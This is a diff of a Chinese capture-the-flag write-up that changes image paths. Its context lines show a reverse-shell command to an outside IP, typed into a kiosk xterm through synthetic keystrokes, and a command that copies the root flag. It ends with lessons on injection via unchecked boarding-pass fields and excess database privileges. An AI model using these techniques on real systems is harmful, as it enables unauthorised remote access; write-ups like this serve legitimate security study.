@@ -161,7 +161,7 @@ d.sync()
 
 会弹出一个 `dutyfree-kiosk` 的 xterm。注意 Openbox 会把窗口 reparent 到 frame，直接列 root 的子窗口看不到它，要递归找 `WM_CLASS = ('xterm','XTerm')` 的窗口，`set_input_focus` 之后再逐字符合成键盘事件（`/`、`>`、`"` 这些要带 Shift），把命令敲进去：
 
-![1](../../dutybound/01-x11-kiosk.png)
+![1](/dutybound/01-x11-kiosk.png)
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.10.16.245/4445 0>&1"
@@ -213,7 +213,7 @@ cp /root/root.txt /tmp/rootflag;chmod 644 /tmp/rootflag;b,45,20
 
 ## 6. 收尾：这台机器考什么
 
-![2](../../dutybound/02-solved.png)
+![2](/dutybound/02-solved.png)
 
 - **结构化输入不等于安全输入**：BCBP 的必填字段校验做得不错，但尾部「航司自定义数据」没有同等对待；
 - **数据库权限决定注入的影响面**：应用角色只有 SELECT/INSERT，却额外挂了 `pg_execute_server_program`，注入直接升级成 OS 命令执行；
